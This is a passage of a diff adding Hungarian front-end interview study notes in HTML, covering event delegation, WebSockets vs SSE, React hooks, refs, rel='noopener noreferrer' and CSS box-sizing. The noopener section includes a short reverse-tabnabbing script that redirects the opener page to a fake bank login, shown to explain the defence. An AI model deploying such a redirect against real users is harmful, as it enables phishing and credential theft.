+  e.target.classList.add("focused");
+});
+
+document.getElementById("form").addEventListener("focusout", (e) => {
+  e.target.classList.remove("focused");
+});</code></pre>
+
+<div class="note">
+  <strong>Interjú tipp:</strong> Az event delegation a <strong>bubbling fázisra</strong> épül. Használjuk <code>e.target.closest(selector)</code>-t a cél elem biztonságos azonosítására, mert a kattintás célpontja lehet a gyerek elem egy belső eleme is (pl. egy <code>&lt;span&gt;</code> egy <code>&lt;button&gt;</code>-on belül). Ha focus/blur-ra kell delegálni, használjuk a <code>focusin</code>/<code>focusout</code> változatokat.
+</div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<!-- 5. WEBSOCKETS VS SERVER-SENT EVENTS (SSE) -->
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<div class="section" id="q5">
+<h2>5. WebSockets vs Server-Sent Events (SSE)</h2>
+<span class="tag">Hálózat</span>
+
+<p>A hagyományos HTTP a <strong>kérés-válasz (request-response)</strong> modellre épül: a kliens küld egy kérést, a szerver válaszol, és a kapcsolat lezárul. De mi van, ha a szervernek <strong>valós időben</strong> kell adatot küldenie a kliensnek (chat üzenet, live sport eredmény, részvényárfolyam)? Erre három fő megoldás létezik: <strong>Polling</strong>, <strong>SSE</strong> és <strong>WebSocket</strong>.</p>
+
+<h3>5.1 A három megközelítés fejlődési íve</h3>
+<p><strong>Short Polling:</strong> A kliens rendszeres időközönként (pl. 5 másodpercenként) küld HTTP kéréseket a szervernek, hogy van-e új adat. Egyszerű, de pazarló – sok felesleges kérés, ha nincs új adat.</p>
+<p><strong>Long Polling:</strong> A kliens küld egy kérést, de a szerver <strong>nem válaszol azonnal</strong> – megvárja, amíg lesz új adat (vagy timeout). Amint válaszol, a kliens azonnal küld egy újabb kérést. Jobb mint a short polling, de még mindig HTTP overhead minden "üzenetnél".</p>
+<p><strong>SSE / WebSocket:</strong> Tartós kapcsolat – nincs szükség újra és újra kérést küldeni.</p>
+
+<h3>5.2 Összehasonlítás</h3>
+<table>
+  <tr><th>Szempont</th><th>WebSocket</th><th>SSE</th></tr>
+  <tr><td>Irány</td><td><strong>Kétirányú</strong> (full-duplex)</td><td><strong>Egyirányú</strong> (szerver → kliens)</td></tr>
+  <tr><td>Protokoll</td><td><code>ws://</code> / <code>wss://</code></td><td>Sima HTTP (text/event-stream)</td></tr>
+  <tr><td>Újracsatlakozás</td><td>Kézzel kell implementálni</td><td>Automatikus (beépített)</td></tr>
+  <tr><td>Adat formátum</td><td>Szöveg + bináris</td><td>Csak szöveg (UTF-8)</td></tr>
+  <tr><td>HTTP/2 kompatibilis</td><td>Nem (upgrade szükséges)</td><td>Igen – multiplexálható</td></tr>
+  <tr><td>Proxy/Firewall barát</td><td>Gyakran problémás</td><td>Jól átmegy (sima HTTP)</td></tr>
+  <tr><td>Használat</td><td>Chat, játékok, real-time együttműködés</td><td>Értesítések, live feed, dashboard frissítés</td></tr>
+</table>
+
+<h3>5.3 WebSocket példa</h3>
+<p>A WebSocket egy teljesen más protokoll, mint a HTTP. A kapcsolat egy HTTP <strong>upgrade</strong> kéréssel indul (handshake), majd átvált a WebSocket protokollra (<code class="inline-code">ws://</code> vagy titkosítva <code class="inline-code">wss://</code>). Ezután a kliens és a szerver <strong>bármikor, bármelyik irányban</strong> küldhetnek üzeneteket, amíg valamelyik fél le nem zárja a kapcsolatot.</p>
+<pre><code>// KLIENS oldal
+const ws = new WebSocket("wss://example.com/socket");
+
+ws.onopen = () => {
+  console.log("Kapcsolat nyitva");
+  ws.send(JSON.stringify({ type: "greeting", msg: "Helló szerver!" }));
+};
+
+ws.onmessage = (event) => {
+  const data = JSON.parse(event.data);
+  console.log("Szerver üzenet:", data);
+};
+
+ws.onclose = (event) => {
+  console.log(`Kapcsolat lezárva: ${event.code} – ${event.reason}`);
+  // Kézi újracsatlakozás szükséges!
+};
+
+ws.onerror = (error) => {
+  console.error("WebSocket hiba:", error);
+};
+
+// Üzenet küldése bármikor
+function sendMessage(msg) {
+  if (ws.readyState === WebSocket.OPEN) {
+    ws.send(JSON.stringify(msg));
+  }
+}</code></pre>
+
+<h3>5.4 Server-Sent Events (SSE) példa</h3>
+<p>Az SSE egy egyszerűbb mechanizmus, ami sima HTTP-t használ. A szerver egy <code class="inline-code">text/event-stream</code> típusú választ küld, ami nyitva marad és folyamatosan streamel szöveges adatokat. A kliens oldalon az <code class="inline-code">EventSource</code> API kezeli a kapcsolatot, beleértve az <strong>automatikus újracsatlakozást</strong> hiba esetén – ezt WebSocketnél magadnak kellene implementálni.</p>
+<pre><code>// KLIENS oldal
+const source = new EventSource("/api/events");
+
+source.onopen = () => {
+  console.log("SSE kapcsolat nyitva");
+};
+
+// Alapértelmezett "message" esemény
+source.onmessage = (event) => {
+  console.log("Adat:", event.data);
+  console.log("ID:", event.lastEventId);
+};
+
+// Egyedi nevű események
+source.addEventListener("notification", (event) => {
+  const data = JSON.parse(event.data);
+  console.log("Értesítés:", data);
+});
+
+source.onerror = () => {
+  console.log("Hiba – automatikusan újracsatlakozik!");
+  // Az EventSource automatikusan újracsatlakozik!
+};
+
+// Lezárás
+source.close();</code></pre>
+
+<pre><code>// SZERVER oldal (Node.js/Express)
+app.get("/api/events", (req, res) => {
+  res.writeHead(200, {
+    "Content-Type": "text/event-stream",
+    "Cache-Control": "no-cache",
+    "Connection": "keep-alive",
+  });
+
+  // Egyszerű üzenet
+  res.write("data: Helló kliens!\n\n");
+
+  // Egyedi esemény típus + ID
+  res.write("event: notification\n");
+  res.write("id: 42\n");
+  res.write(`data: ${JSON.stringify({ title: "Új üzenet" })}\n\n`);
+
+  // Periodikus küldés
+  const interval = setInterval(() => {
+    res.write(`data: ${new Date().toISOString()}\n\n`);
+  }, 5000);
+
+  req.on("close", () => clearInterval(interval));
+});</code></pre>
+
+<div class="note">
+  <strong>Mikor melyiket?</strong>
+  <ul>
+    <li><strong>WebSocket</strong>: Ha a kliensnek IS kell adatot küldenie a szervernek (chat, multiplayer játék)</li>
+    <li><strong>SSE</strong>: Ha csak a szerver küld adatot (dashboard frissítés, értesítések, live feed) – egyszerűbb és megbízhatóbb</li>
+  </ul>
+</div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<!-- 6. REACT HOOKS: useOptimistic, useTransition, useLayoutEffect -->
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<div class="section" id="q6">
+<h2>6. React Hooks: useOptimistic, useTransition, useLayoutEffect</h2>
+<span class="tag">React</span>
+
+<p>Ezek a hookok a React <strong>haladó szintű</strong> eszközei, amelyek a felhasználói élmény finomhangolására szolgálnak. Mindhárom egy-egy konkrét problémát old meg: az azonnali visszajelzést (optimistic update), a prioritás-kezelést (concurrent rendering), és a vizuális "villanások" elkerülését (szinkron DOM mérés). A legtöbb alkalmazásban ritkán kellenek, de ha kellenek, nincsen alternatívájuk.</p>
+
+<h3>6.1 useOptimistic (React 19+)</h3>
+<p>Lehetővé teszi, hogy <strong>azonnal megmutassuk a várt eredményt</strong> a felhasználónak, mielőtt a szerver válaszolna. Ha a kérés sikertelen, automatikusan visszaáll az előző állapotra.</p>
+
+<pre><code>import { useOptimistic } from "react";
+
+function TodoList({ todos, addTodoAction }) {
+  // 1. param: aktuális (szerver) állapot
+  // 2. param: reducer – hogyan módosítsa optimistán az állapotot
+  const [optimisticTodos, addOptimistic] = useOptimistic(
+    todos,
+    (currentTodos, newTodoText) => [
+      ...currentTodos,
+      { id: crypto.randomUUID(), text: newTodoText, pending: true }
+    ]
+  );
+
+  async function handleSubmit(formData) {
+    const text = formData.get("todo");
+    addOptimistic(text);           // Azonnal megjelenik a UI-ban
+    await addTodoAction(text);     // Szerver hívás – ha sikertelen, visszaáll
+  }
+
+  return (
+    &lt;div&gt;
+      &lt;form action={handleSubmit}&gt;
+        &lt;input name="todo" /&gt;
+        &lt;button type="submit"&gt;Hozzáad&lt;/button&gt;
+      &lt;/form&gt;
+      &lt;ul&gt;
+        {optimisticTodos.map(todo =&gt; (
+          &lt;li key={todo.id} style={{ opacity: todo.pending ? 0.5 : 1 }}&gt;
+            {todo.text}
+          &lt;/li&gt;
+        ))}
+      &lt;/ul&gt;
+    &lt;/div&gt;
+  );
+}</code></pre>
+
+<h3>6.2 useTransition</h3>
+<p>A React 18-ban megjelent <strong>concurrent rendering</strong> egyik kulcs-hookja. Lehetővé teszi, hogy egy state frissítést <strong>alacsony prioritásúként</strong> jelöljünk meg, így a UI reszponzív marad a "nehéz" frissítés közben is. A React megszakíthatja a renderelést, ha közben magasabb prioritású frissítés érkezik (pl. a felhasználó gépel). Az <code class="inline-code">isPending</code> boolean jelzi, hogy a transition még folyamatban van – ezt loading indikátor megjelenítésére használhatjuk.</p>
+
+<pre><code>import { useState, useTransition } from "react";
+
+function SearchPage() {
+  const [query, setQuery] = useState("");
+  const [results, setResults] = useState([]);
+  const [isPending, startTransition] = useTransition();
+
+  function handleChange(e) {
+    const value = e.target.value;
+    setQuery(value); // Magas prioritás – azonnal frissül az input
+
+    startTransition(() => {
+      // Alacsony prioritás – a React megszakíthatja, ha új input jön
+      const filtered = hugeDataset.filter(item =>
+        item.name.toLowerCase().includes(value.toLowerCase())
+      );
+      setResults(filtered);
+    });
+  }
+
+  return (
+    &lt;div&gt;
+      &lt;input value={query} onChange={handleChange} /&gt;
+      {isPending &amp;&amp; &lt;p&gt;Keresés...&lt;/p&gt;}
+      &lt;ul&gt;
+        {results.map(r =&gt; &lt;li key={r.id}&gt;{r.name}&lt;/li&gt;)}
+      &lt;/ul&gt;
+    &lt;/div&gt;
+  );
+}
+
+// Összehasonlítás useDeferredValue-val:
+// useTransition: TE döntöd el, melyik setState alacsony prioritású
+// useDeferredValue: egy ÉRTÉKET jelölsz meg alacsony prioritásúként</code></pre>
+
+<p><strong>useDeferredValue</strong> – testvér hook, ami hasonló célt szolgál, de más megközelítéssel: nem egy <em>setState hívást</em> csomagolsz be, hanem egy <em>értéket</em> jelölsz meg alacsony prioritásúnak. Hasznos, ha a state frissítés nem a te kontrollod alatt van (pl. prop-ként kapod).</p>
+
+<pre><code>import { useState, useDeferredValue } from "react";
+
+function SearchResults({ query }) {
+  // A query prop változik – de a nehéz renderelést elhalasztjuk
+  const deferredQuery = useDeferredValue(query);
+  const isStale = query !== deferredQuery; // "régi" adat jelzése
+
+  // A lista a deferredQuery-vel renderel – csak ha a React "ráér"
+  return (
+    &lt;div style={{ opacity: isStale ? 0.6 : 1 }}&gt;
+      &lt;HeavyList filter={deferredQuery} /&gt;
+    &lt;/div&gt;
+  );
+}</code></pre>
+
+<h3>6.3 useLayoutEffect</h3>
+<p>Ugyanaz, mint a <code class="inline-code">useEffect</code>, de <strong>szinkronban fut a DOM festés (paint) ELŐTT</strong>. Akkor kell, ha a DOM-ot mérni vagy módosítani akarod, mielőtt a felhasználó bármit is látna.</p>
+
+<pre><code>import { useState, useLayoutEffect, useRef } from "react";
+
+function Tooltip({ text, targetRect }) {
+  const tooltipRef = useRef(null);
+  const [position, setPosition] = useState({ top: 0, left: 0 });
+
+  useLayoutEffect(() => {
+    // A DOM már létezik, de a böngésző MÉG NEM festette ki
+    const { height, width } = tooltipRef.current.getBoundingClientRect();
+
+    // Pozícionáljuk a tooltip-et, hogy ne lógjon ki a képernyőről
+    setPosition({
+      top: targetRect.top - height - 8,
+      left: targetRect.left + (targetRect.width - width) / 2,
+    });
+  }, [targetRect]);
+
+  return (
+    &lt;div ref={tooltipRef} style={{ position: "absolute", ...position }}&gt;
+      {text}
+    &lt;/div&gt;
+  );
+}
+
+/*
+  useEffect vs useLayoutEffect:
+
+  useEffect:
+    render → DOM frissül → BÖNGÉSZŐ FEST → useEffect lefut
+    ✅ Alapértelmezett választás (API hívások, subscriptions)
+
+  useLayoutEffect:
+    render → DOM frissül → useLayoutEffect lefut → BÖNGÉSZŐ FEST
+    ✅ DOM mérés, pozícionálás – elkerüli a "villanást" (flickering)
+    ⚠️  Blokkolja a festést – csak ha szükséges!
+*/</code></pre>
+
+<div class="note">
+  <strong>Összefoglalás:</strong>
+  <ul>
+    <li><code>useOptimistic</code> – azonnali UI frissítés szerver válasz előtt</li>
+    <li><code>useTransition</code> – nehéz frissítések alacsony prioritással</li>
+    <li><code>useLayoutEffect</code> – DOM mérés/módosítás festés előtt</li>
+  </ul>
+</div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<!-- 7. useState VS useReducer -->
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<div class="section" id="q7">
+<h2>7. useState vs useReducer</h2>
+<span class="tag">React</span>
+
+<p>Mindkét hook <strong>komponens-szintű állapotkezelésre</strong> szolgál, de különböző komplexitási szintekre vannak optimalizálva. A <code class="inline-code">useState</code> az egyszerű, független értékekhez való, míg a <code class="inline-code">useReducer</code> a komplex, egymástól függő állapotokhoz, ahol a frissítési logika több "ágat" tartalmaz. A háttérben a React a <code>useState</code>-et is <code>useReducer</code>-rel implementálja – tehát ugyanaz a mechanizmus, csak más szintű absztrakció.</p>
+
+<h3>7.1 Mikor melyiket?</h3>
+<table>
+  <tr><th>Szempont</th><th>useState</th><th>useReducer</th></tr>
+  <tr><td>Állapot típusa</td><td>Egyszerű (szám, string, boolean)</td><td>Komplex (objektum, több összefüggő érték)</td></tr>
+  <tr><td>Frissítési logika</td><td>Egyszerű set</td><td>Több akció, feltételes logika</td></tr>
+  <tr><td>Tesztelhetőség</td><td>Nehezebb izoláltan tesztelni</td><td>Reducer purefn – könnyen tesztelhető</td></tr>
+  <tr><td>Debug</td><td>Kevésbé átlátható</td><td>Action-ök követhetők (mint Redux)</td></tr>
+</table>
+
+<h3>7.2 useState példa</h3>
+<pre><code>function Counter() {
+  const [count, setCount] = useState(0);
+
+  return (
+    &lt;div&gt;
+      &lt;p&gt;{count}&lt;/p&gt;
+      &lt;button onClick={() =&gt; setCount(c =&gt; c + 1)}&gt;+1&lt;/button&gt;
+      &lt;button onClick={() =&gt; setCount(c =&gt; c - 1)}&gt;-1&lt;/button&gt;
+      &lt;button onClick={() =&gt; setCount(0)}&gt;Reset&lt;/button&gt;
+    &lt;/div&gt;
+  );
+}</code></pre>
+
+<h3>7.3 useReducer példa – ugyanaz a counter, de komplexebb logikával</h3>
+<pre><code>// A reducer egy PURE FUNCTION – könnyen tesztelhető!
+function counterReducer(state, action) {
+  switch (action.type) {
+    case "INCREMENT":
+      return { ...state, count: state.count + action.payload };
+    case "DECREMENT":
+      return { ...state, count: Math.max(0, state.count - action.payload) };
+    case "RESET":
+      return { ...state, count: 0 };
+    default:
+      throw new Error(`Ismeretlen action: ${action.type}`);
+  }
+}
+
+function Counter() {
+  const [state, dispatch] = useReducer(counterReducer, { count: 0 });
+
+  return (
+    &lt;div&gt;
+      &lt;p&gt;{state.count}&lt;/p&gt;
+      &lt;button onClick={() =&gt; dispatch({ type: "INCREMENT", payload: 1 })}&gt;+1&lt;/button&gt;
+      &lt;button onClick={() =&gt; dispatch({ type: "DECREMENT", payload: 1 })}&gt;-1&lt;/button&gt;
+      &lt;button onClick={() =&gt; dispatch({ type: "RESET" })}&gt;Reset&lt;/button&gt;
+    &lt;/div&gt;
+  );
+}
+
+// Reducer tesztelése (izoláltan, React nélkül!):
+console.assert(
+  counterReducer({ count: 5 }, { type: "INCREMENT", payload: 3 }).count === 8
+);
+console.assert(
+  counterReducer({ count: 2 }, { type: "DECREMENT", payload: 10 }).count === 0
+);</code></pre>
+
+<h3>7.4 Komplex példa: Form kezelés useReducer-rel</h3>
+<pre><code>function formReducer(state, action) {
+  switch (action.type) {
+    case "SET_FIELD":
+      return { ...state, [action.field]: action.value, errors: {} };
+    case "SET_ERROR":
+      return { ...state, errors: { ...state.errors, [action.field]: action.message } };
+    case "SET_SUBMITTING":
+      return { ...state, isSubmitting: action.value };
+    case "RESET":
+      return { name: "", email: "", errors: {}, isSubmitting: false };
+    default:
+      throw new Error(`Ismeretlen action: ${action.type}`);
+  }
+}
+
+function RegistrationForm() {
+  const [state, dispatch] = useReducer(formReducer, {
+    name: "",
+    email: "",
+    errors: {},
+    isSubmitting: false,
+  });
+
+  async function handleSubmit(e) {
+    e.preventDefault();
+    if (!state.name) {
+      dispatch({ type: "SET_ERROR", field: "name", message: "Név kötelező!" });
+      return;
+    }
+    dispatch({ type: "SET_SUBMITTING", value: true });
+    await api.register(state);
+    dispatch({ type: "RESET" });
+  }
+
+  return (
+    &lt;form onSubmit={handleSubmit}&gt;
+      &lt;input
+        value={state.name}
+        onChange={e =&gt; dispatch({ type: "SET_FIELD", field: "name", value: e.target.value })}
+      /&gt;
+      {state.errors.name &amp;&amp; &lt;span&gt;{state.errors.name}&lt;/span&gt;}
+      &lt;button disabled={state.isSubmitting}&gt;Regisztráció&lt;/button&gt;
+    &lt;/form&gt;
+  );
+}</code></pre>
+
+<h3>7.5 Lazy initialization – nagy kezdőállapot optimalizálása</h3>
+<p>Ha a kezdőállapot kiszámítása "drága" művelet (pl. localStorage olvasása, nagy adat feldolgozása), <strong>ne közvetlenül add át</strong> az értéket, hanem egy <strong>inicializáló függvényt</strong>. Ez a függvény csak az <strong>első rendereléskor</strong> fut le – a további rendereléseknél nem.</p>
+
+<pre><code>// ❌ ROSSZ – minden rendereléskor lefut a JSON.parse (feleslegesen)
+const [items, setItems] = useState(JSON.parse(localStorage.getItem("items")) || []);
+
+// ✅ JÓ – lazy initializer: csak az ELSŐ rendereléskor fut le
+const [items, setItems] = useState(() => {
+  const saved = localStorage.getItem("items");
+  return saved ? JSON.parse(saved) : [];
+});
+
+// useReducer-nél is használható (3. paraméter):
+const [state, dispatch] = useReducer(
+  reducer,
+  initialArg,       // ez kerül átadásra az init függvénynek
+  (arg) => ({        // init függvény – csak egyszer fut le
+    ...arg,
+    loaded: true,
+  })
+);</code></pre>
+
+<h3>7.6 State batching</h3>
+<p>A React 18 óta <strong>minden state frissítés automatikusan batching-elt</strong> – vagyis ha több <code>setState</code>-et hívunk egymás után, a React nem renderel mindegyik után külön, hanem összegyűjti és <strong>egyetlen újrarenderelésbe</strong> foglalja össze. Ez React 17-ben csak event handlerekben működött; React 18-ban már mindenhol (setTimeout, promise, natív event handlerben is).</p>
+
+<pre><code>// React 18+ – AUTOMATIKUS batching mindenhol
+function handleClick() {
+  setCount(c => c + 1);  // NEM renderel
+  setFlag(f => !f);       // NEM renderel
+  setName("Anna");        // EZ UTÁN renderel – egyetlen alkalommal!
+}
+
+// Még async-ban is batch-el:
+setTimeout(() => {
+  setCount(c => c + 1);  // NEM renderel
+  setFlag(f => !f);       // NEM renderel
+  // → 1 renderelés a setTimeout végén
+}, 1000);
+
+// Ha MÉGIS azonnali renderelést akarsz (ritka):
+import { flushSync } from "react-dom";
+
+flushSync(() => setCount(c => c + 1)); // → AZONNAL renderel
+flushSync(() => setFlag(f => !f));     // → AZONNAL renderel</code></pre>
+
+<div class="note">
+  <strong>Ökölszabály:</strong> Ha több, mint 2-3 egymáshoz kapcsolódó <code>useState</code>-et használnál, válts <code>useReducer</code>-re. Használj lazy initialization-t ha a kezdőállapot számítása drága. A batching automatikus React 18-ban – ne aggódj miatta, csak tudd, hogy létezik.
+</div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<!-- 8. CHILD COMPONENT FÜGGVÉNYEK ELÉRÉSE (forwardRef + useImperativeHandle) -->
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<div class="section" id="q8">
+<h2>8. Gyerek komponens függvényeinek elérése</h2>
+<span class="tag">React</span>
+
+<h3>8.1 A probléma</h3>
+<p>Reactben az adatfolyam <strong>felülről lefelé</strong> halad (props → unidirectional data flow). A szülő props-on és callback-eken keresztül kommunikál a gyerekkel. De néha a szülőnek <strong>imperatívan</strong> kell meghívnia a gyerek egy függvényét (pl. <code class="inline-code">.focus()</code>, <code class="inline-code">.reset()</code>, <code class="inline-code">.scrollToTop()</code>). Ilyenkor a <code class="inline-code">ref</code> mechanizmust használjuk, ami "kilép" a normális React adatfolyamból – ezért <strong>csak indokolt esetben</strong> használjuk.</p>
+
+<h3>8.2 forwardRef + useImperativeHandle</h3>
+<p>A <code class="inline-code">forwardRef</code> lehetővé teszi, hogy a szülő által létrehozott <code>ref</code>-et "átadjuk" a gyerek komponensnek. Az <code class="inline-code">useImperativeHandle</code> segítségével <strong>korlátozhatjuk</strong>, milyen metódusokat lát a szülő – nem adjuk ki a teljes DOM elemet, hanem egy szűk, kontrollált API-t definiálunk. Ez jobb encapsulation-t biztosít.</p>
+<pre><code>import { useRef, useImperativeHandle, forwardRef } from "react";
+
+// A gyerek komponens – forwardRef-fel csomagolva
+const CustomInput = forwardRef(function CustomInput(props, ref) {
+  const inputRef = useRef(null);
+
+  // Csak ezeket a metódusokat "mutatjuk ki" a szülőnek
+  useImperativeHandle(ref, () => ({
+    focus() {
+      inputRef.current.focus();
+    },
+    clear() {
+      inputRef.current.value = "";
+    },
+    getValue() {
+      return inputRef.current.value;
+    },
+  }));
+
+  return &lt;input ref={inputRef} {...props} /&gt;;
+});
+
+// A szülő komponens
+function ParentForm() {
+  const inputRef = useRef(null);
+
+  function handleClick() {
+    inputRef.current.focus(); // A gyerek focus() metódusát hívjuk
+  }
+
+  function handleReset() {
+    inputRef.current.clear(); // A gyerek clear() metódusát hívjuk
+  }
+
+  return (
+    &lt;div&gt;
+      &lt;CustomInput ref={inputRef} placeholder="Írj valamit..." /&gt;
+      &lt;button onClick={handleClick}&gt;Fókusz&lt;/button&gt;
+      &lt;button onClick={handleReset}&gt;Törlés&lt;/button&gt;
+    &lt;/div&gt;
+  );
+}</code></pre>
+
+<h3>8.3 React 19+: ref prop közvetlenül (forwardRef nélkül)</h3>
+<pre><code>// React 19-ben a ref sima prop – nem kell forwardRef!
+function CustomInput({ ref, ...props }) {
+  const inputRef = useRef(null);
+
+  useImperativeHandle(ref, () => ({
+    focus: () => inputRef.current.focus(),
+    clear: () => { inputRef.current.value = ""; },
+  }));
+
+  return &lt;input ref={inputRef} {...props} /&gt;;
+}</code></pre>
+
+<h3>8.4 Callback ref – alternatív ref minta</h3>
+<p>A <code class="inline-code">useRef</code> helyett <strong>callback ref</strong>-et is használhatunk: egy függvényt adunk át a <code>ref</code> prop-nak, amit a React meghív, amikor a DOM elem mount-olódik (argumentum: az elem) és unmount-olódik (argumentum: <code>null</code>). Ez hasznos, ha a ref beállításakor azonnal végre akarunk hajtani valamilyen logikát (pl. mérés, observer csatolás).</p>
+
+<pre><code>function MeasuredBox() {
+  // Callback ref – meghívódik, amint a div megjelenik a DOM-ban
+  const measureRef = (node) => {
+    if (node !== null) {
+      const { width, height } = node.getBoundingClientRect();
+      console.log(`Méret: ${width}x${height}`);
+    }
+  };
+
+  return &lt;div ref={measureRef}&gt;Tartalom&lt;/div&gt;;
+}
+
+// Tipikus használat: IntersectionObserver csatolás
+function LazyImage({ src, alt }) {
+  const observerRef = (node) => {
+    if (!node) return;
+    const observer = new IntersectionObserver(([entry]) => {
+      if (entry.isIntersecting) {
+        node.src = src;
+        observer.disconnect();
+      }
+    });
+    observer.observe(node);
+  };
+
+  return &lt;img ref={observerRef} alt={alt} /&gt;;
+}</code></pre>
+
+<div class="warning">
+  <strong>Vigyázat:</strong> Az <code>useImperativeHandle</code>-t ritkán kell használni. A legtöbb esetben a props + callback minta jobb. Csak akkor használd, ha valóban DOM-manipulációra van szükség (focus, scroll, animáció). Jegyezd meg a fő szabályt: <em>"Ha meg tudod oldani props-szal, ne használj ref-et."</em>
+</div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<!-- 9. NOOPENER ÉS NOREFERRER -->
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<div class="section" id="q9">
+<h2>9. noopener és noreferrer</h2>
+<span class="tag">Biztonság</span> <span class="tag">HTML</span>
+
+<p>Amikor <code class="inline-code">target="_blank"</code>-kel nyitunk meg egy külső linket, a megnyitott oldal JavaScript-ből hozzáférhet az eredeti oldal <code class="inline-code">window.opener</code> objektumához. Ez egy biztonsági rés, amit <strong>tabnabbing</strong>-nak vagy <strong>reverse tabnabbing</strong>-nak nevezünk. A <code>rel</code> attribútum értékeivel védekezhetünk ellene.</p>
+
+<h3>9.1 A probléma: target="_blank" biztonsági kockázata (Tabnabbing)</h3>
+<pre><code>&lt;!-- VESZÉLYES – a megnyitott oldal hozzáfér a window.opener-hez! --&gt;
+&lt;a href="https://malicious-site.com" target="_blank"&gt;Kattints&lt;/a&gt;
+
+&lt;!-- A malicious-site.com ezt tudja csinálni: --&gt;
+&lt;script&gt;
+  // Átirányítja az EREDETI oldalt egy phishing oldalra!
+  window.opener.location = "https://fake-bank-login.com";
+&lt;/script&gt;</code></pre>
+
+<h3>9.2 A megoldás</h3>
+<pre><code>&lt;!-- BIZTONSÁGOS --&gt;
+&lt;a href="https://example.com" target="_blank" rel="noopener noreferrer"&gt;
+  Külső link
+&lt;/a&gt;</code></pre>
+
+<table>
+  <tr><th>Attribútum</th><th>Mit csinál?</th></tr>
+  <tr><td><code>noopener</code></td><td>A megnyitott oldal <strong>nem fér hozzá</strong> a <code>window.opener</code>-hez → nem tudja átirányítani az eredeti oldalt. Teljesítményt is javít (külön process).</td></tr>
+  <tr><td><code>noreferrer</code></td><td>Nem küldi el a <code>Referer</code> headert → a céloldal nem tudja, honnan jöttünk. <strong>Magában foglalja a noopener viselkedést is.</strong></td></tr>
+</table>
+
+<h3>9.3 Modern böngészők</h3>
+<p>A modern böngészők (Chrome 88+, Firefox 79+, Safari 12.1+) <strong>automatikusan alkalmazzák a noopener-t</strong> <code class="inline-code">target="_blank"</code> linkekre. De a <code>noreferrer</code>-t explicit kell hozzáadni, ha a referrer-t is el akarod rejteni.</p>
+
+<pre><code>// React / JSX-ben
+function ExternalLink({ href, children }) {
+  return (
+    &lt;a href={href} target="_blank" rel="noopener noreferrer"&gt;
+      {children}
+    &lt;/a&gt;
+  );
+}
+
+// ESLint rule ami figyelmeztet ha hiányzik:
+// "react/jsx-no-target-blank": "error"</code></pre>
+
+<h3>9.4 window.open() esetén is figyelni kell</h3>
+<p>A <code class="inline-code">window.open()</code> JavaScript hívással megnyitott ablakoknál ugyanez a probléma fennáll. A modern böngészőkben a <code>noopener</code> feature-t explicit be kell kapcsolni:</p>
+
+<pre><code>// ❌ ROSSZ – az új ablak hozzáfér a window.opener-hez
+window.open("https://external-site.com");
+
+// ✅ JÓ – noopener bekapcsolva
+window.open("https://external-site.com", "_blank", "noopener,noreferrer");
+
+// Vagy nullázd a referenciát kézzel (régebbi megoldás):
+const newWindow = window.open("https://external-site.com");
+newWindow.opener = null;</code></pre>
+
+<h3>9.5 Kapcsolódó: rel="nofollow"</h3>
+<p>Bár nem biztonsági célú, a <code class="inline-code">rel="nofollow"</code>-t is gyakran kérdezik ugyanebben a kontextusban. Ez egy <strong>SEO-utasítás</strong> a keresőrobotoknak, hogy <strong>ne kövessék</strong> a linket és ne adjanak "link juice"-t a céloldalnak. Felhasználó által generált tartalomnál (kommentek, fórum) ajánlott a spam elleni védekezésre.</p>
+
+<pre><code>&lt;!-- Komplett külső link – biztonsági + SEO védelem --&gt;
+&lt;a href="https://untrusted-site.com" target="_blank" rel="noopener noreferrer nofollow"&gt;
+  Felhasználó által beküldött link
+&lt;/a&gt;</code></pre>
+
+<div class="note">
+  <strong>Interjú tipp:</strong> A <code>noreferrer</code> magában foglalja a <code>noopener</code> viselkedést is, tehát ha mindkettőt szeretnéd, elég a <code>noreferrer</code> – de a szándékot jobban jelzi, ha mindkettőt kiírod. A <code>nofollow</code> más célú: SEO, nem biztonság.
+</div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<!-- 10. CSS BOX-SIZING -->
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<div class="section" id="q10">
+<h2>10. CSS box-sizing</h2>
+<span class="tag">CSS</span>
+
+<p>A CSS-ben minden elem egy <strong>téglalap alakú doboz</strong> (box). Ez a doboz 4 rétegből áll (belülről kifelé): <strong>content</strong> (tartalom) → <strong>padding</strong> (belső margó) → <strong>border</strong> (keret) → <strong>margin</strong> (külső margó). A <code class="inline-code">box-sizing</code> property határozza meg, hogy a <code>width</code> és <code>height</code> értékek <strong>melyik rétegekre vonatkoznak</strong>.</p>
+
+<p>Történelmi érdekesség: a régi Internet Explorer (IE5) "hibásan" a <code>border-box</code> modellt használta, míg a W3C szabvány a <code>content-box</code>-ot definiálta alapértelmezettként. Ironikus módon az IE modellje bizonyult intuitívabbnak, ezért a modern CSS-ben szinte mindig felülírjuk az alapértelmezést <code>border-box</code>-ra.</p>
+
+<h3>10.1 A két modell</h3>
+
+<pre><code>/*
+  content-box (ALAPÉRTELMEZETT):
+  ┌─────────────────────────────────┐
+  │ margin                          │
+  │  ┌───────────────────────────┐  │
+  │  │ border                    │  │
+  │  │  ┌─────────────────────┐  │  │
+  │  │  │ padding             │  │  │
+  │  │  │  ┌───────────────┐  │  │  │
+  │  │  │  │   CONTENT     │  │  │  │
+  │  │  │  │   width=200   │  │  │  │
+  │  │  │  └───────────────┘  │  │  │
+  │  │  │  padding: 20px      │  │  │
+  │  │  └─────────────────────┘  │  │
+  │  │  border: 2px              │  │
+  │  └───────────────────────────┘  │
+  │  margin: 10px                   │
+  └─────────────────────────────────┘
+
+  Teljes szélesség = 200 + 20*2 + 2*2 = 244px (+ margin)
+  A width CSAK a content-re vonatkozik!
+
+  ─────────────────────────────────────
+
+  border-box:
+  ┌─────────────────────────────────┐
+  │ margin                          │
+  │  ┌───────────────────────────┐  │
+  │  │         width=200         │  │
+  │  │  ┌─────────────────────┐  │  │
+  │  │  │ padding             │  │  │
+  │  │  │  ┌───────────────┐  │  │  │
+  │  │  │  │   CONTENT     │  │  │  │
